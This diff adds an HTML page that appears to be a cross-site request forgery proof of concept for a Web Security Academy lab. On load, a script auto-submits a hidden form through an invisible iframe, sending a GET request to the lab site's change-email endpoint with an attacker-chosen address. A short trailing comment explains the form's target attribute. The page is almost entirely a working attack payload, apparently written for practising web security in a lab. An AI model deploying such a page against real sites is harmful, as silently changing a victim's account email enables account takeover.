@@ -1,0 +1,15 @@
+<html>
+	<body>
+		<h1>Hello World</h1>
+		<iframe style="display:none" name="csrf-iframe"></iframe>
+		<form action="https://acd31f081e34338ec11d0952001c004a.web-security-academy.net/my-account/change-email" id=csrf-form method="GET" target=csrf-iframe>
+			<input type="hidden" name="email" value="test1@test.ca">
+		</form>
+
+		<script>document.getElementById("csrf-form").submit()</script>
+	</body>
+</html>
+
+
+
+<!____The "target" attribute specifies a name or a keyword that indicates where to display the response that is received after submitting the form>
